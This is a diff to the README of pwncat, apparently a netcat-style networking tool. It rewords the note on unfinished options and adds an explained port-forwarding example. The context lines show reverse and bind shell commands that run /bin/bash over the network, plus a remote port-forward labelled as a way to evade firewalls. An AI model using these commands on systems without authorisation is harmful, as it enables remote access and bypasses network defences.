@@ -41,7 +41,7 @@ Apart from that the current features of `nc`, `ncat` or `socat` just didn't feed
 tool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.
 (Wait for it, binary releases for Linux, MacOS and Windows will come shortly).
 
-The options `-L`, and `-R` are still under development. See [Roadmap](https://github.com/cytopia/pwncat/issues/2) and [Changelog](CHANGELOG.md) for details.
+Some options are still under development. See [Roadmap](https://github.com/cytopia/pwncat/issues/2) and [Changelog](CHANGELOG.md) for details.
 
 
 ## :tada: Install
@@ -71,12 +71,21 @@ pwncat -l -e '/bin/bash' 8080
 pwncat -e '/bin/bash' example.com 4444
 ```
 #### Port-forwarding without SSH
+
+See here to un-brainfuck: https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/. Using the same examples to make it more clear.
+
+The only difference to SSH port-forwarding as shown in the blog is that in their case, the MySQL server is only available on localhost on the remote server.
+SSH portfowarding is exactly for this case, as it SSH's into the machine and can reach their local port.
+In the example here, we cannot SSH into the server, so we can only forward/proxy something which is externally available.
+That's why we just assume the MySQL server is listening publically on everythingcli.org (i.e, their port 3306 is externally available.)
 ```bash
-# Make local port available to public interface locally
-pwncat -L 127.0.0.1:3306 192.168.0.1 3306
+# Local port forward (-L)
+# Make Remote MySQL server (remote port 3306) available on local machine on local port 5000
+# (listen locally on 127.0.0.1:5000 and proxy everything to everythingcli.org:3306)
+pwncat -L 127.0.0.1:5000 everythingcli.org 3306
 ```
 ```bash
-# Remote port-forwarding to evade firewalls
+# Remote port forward (-R) to evade firewalls
 pwncat -R 127.0.0.1:3306 example.com 4444
 ```
 
